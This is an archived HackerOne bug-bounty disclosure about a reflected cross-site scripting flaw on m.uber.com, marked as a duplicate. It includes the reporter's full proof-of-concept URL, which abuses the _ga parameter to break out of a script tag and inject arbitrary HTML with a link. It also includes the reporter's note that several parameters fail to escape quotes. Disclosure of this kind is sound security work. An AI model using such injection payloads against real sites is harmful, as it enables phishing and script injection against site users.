---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "duplicate"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
date: 2017-12-26
submitted: 2017-12-22T18:00:25.129Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/uber|Uber]]"
reporter: "gregoryvperry"
source: "https://hackerone.com/reports/300081"
title: "SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint"
---
# SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** Uber | **Disclosed:** 2017-12-26

- Report: [https://hackerone.com/reports/300081](https://hackerone.com/reports/300081)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2017-12-22T18:00:25.129Z

## Timeline

- **Report Filed**
- **2017-12-22** @lindsey-uber: Thanks for another one, @gregperry. We'll look into this and follow up once we have more information.
- **2017-12-22** @gregoryvperry: Using the _ga query variable to generate arbitrary text, protected by Uber's SSL certificate, and without triggering Chrome's XSS_Auditor:

https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf"}}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D"http%3A%2F%2Fwww.lyft.com">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A
- **2017-12-22** @lindsey-uber: Hey @gregperry -- we believe this issue affects most or all of `m.uber.com`. Can you provide any evidence that the cause of the vulnerability you're reporting here is distinct from what you reported in #296701?
- **2017-12-22** @gregoryvperry: No idea, I don't have access to the application back end.

Several query variables are not properly escaping single quotes, with the ability to inject completely arbitrary html and/or javascript from each individual query string.

In a conventional penetration test, a client would want to know about every possible attack vector.
- **Report Duplicate**
- **Comments Closed**
- **Agreed On Going Public**
- **Manually Disclosed**
